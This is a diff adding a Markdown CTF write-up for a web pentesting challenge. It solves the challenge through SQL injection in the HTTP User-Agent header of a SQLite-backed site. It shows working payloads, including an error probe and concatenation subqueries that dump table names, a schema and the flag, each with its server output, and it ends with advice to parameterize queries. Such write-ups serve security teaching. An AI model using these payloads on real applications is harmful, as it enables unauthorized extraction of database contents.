@@ -1,0 +1,73 @@
+---
+title: "Tu eres pobre tu no tiene aifon"
+description: "The website presents a futuristic shipment tracking system for \"MegaSpace Logistics\"."
+date: 2026-02-13T12:09:00.000Z
+tags: ["ctf", "pentesting-web", "adabyron"]
+ctf: "Cátedra Ada Byron UAH (INCIBE)"
+category: "Pentesting Web"
+---
+
+**CTF:** Cátedra Ada Byron UAH (INCIBE)  
+**Category:** Pentesting Web  
+**Difficulty:** 40  
+
+## Challenge
+
+The website presents a futuristic shipment tracking system for "MegaSpace Logistics". It features a single input field asking for a tracking ID (`TRK-XXXX`) and a green console box that reflects back your User-Agent string:
+
+> Acceso registrado para el agente: Mozilla/5.0 (Windows NT 10.0; ...) | ID de seguimiento no encontrado.
+
+## Solution
+
+The tracking ID field turned out to be a red herring — inputs there were sanitized and simply returned "not found." The real clue was on the secondary pages.
+
+The `/contact` page contained a note: *"asegúrese de que su cadena User-Agent cumpla con los Estándares de la Federación"* (make sure your User-Agent complies with Federation Standards). The `/about` page reinforced this with: *"sistema de auditoría basado en cabeceras"* (header-based audit system). Both pointed directly at the User-Agent header as the attack surface.
+
+Using Burp Suite to intercept the request, I replaced the `User-Agent` header with a single quote:
+
+```
+User-Agent: ' OR '1'='1'--
+```
+
+The server responded with:
+
+> Error de registro: incomplete input
+
+A SQL error — and specifically a **SQLite** one. Attempting `UNION SELECT` confirmed the injection was inside an `INSERT` statement, not a `SELECT`, since `UNION` threw a syntax error.
+
+Since the User-Agent value is reflected back in the response, I used SQLite string concatenation (`||`) with a subquery to exfiltrate data directly through the displayed output:
+
+```
+User-Agent: test'||(SELECT group_concat(tbl_name) FROM sqlite_master)||'
+```
+
+This returned:
+
+> Acceso registrado para el agente: testshipments,access_logs,sqlite_sequence,flags
+
+A `flags` table — promising. I grabbed its schema next:
+
+```
+User-Agent: test'||(SELECT group_concat(sql) FROM sqlite_master WHERE tbl_name='flags')||'
+```
+
+> Acceso registrado para el agente: testCREATE TABLE flags (flag TEXT)
+
+And finally extracted the flag:
+
+```
+User-Agent: test'||(SELECT group_concat(flag) FROM flags)||'
+```
+
+> Acceso registrado para el agente: testFLAG\{H3ad3r_Inj3ct1on_1s_Real\}
+
+## Takeaway
+
+This is a great example of **second-order SQL injection through HTTP headers**. The server blindly inserts the `User-Agent` header into a SQLite database without sanitization. While the obvious input field (tracking ID) was properly handled, the logging mechanism was vulnerable. The key techniques used were:
+
+- **Recognizing the injection point** through hints on secondary pages and observing reflected output.
+- **Identifying the database engine** (SQLite) from error messages.
+- **Adapting to INSERT context** — using `||` concatenation with subqueries instead of `UNION SELECT`, since injection occurred inside an `INSERT` statement.
+- **Exfiltrating data** through the reflected User-Agent value displayed on the page.
+
+In a real application, all user-controlled input — including HTTP headers — must be parameterized before reaching any SQL query.
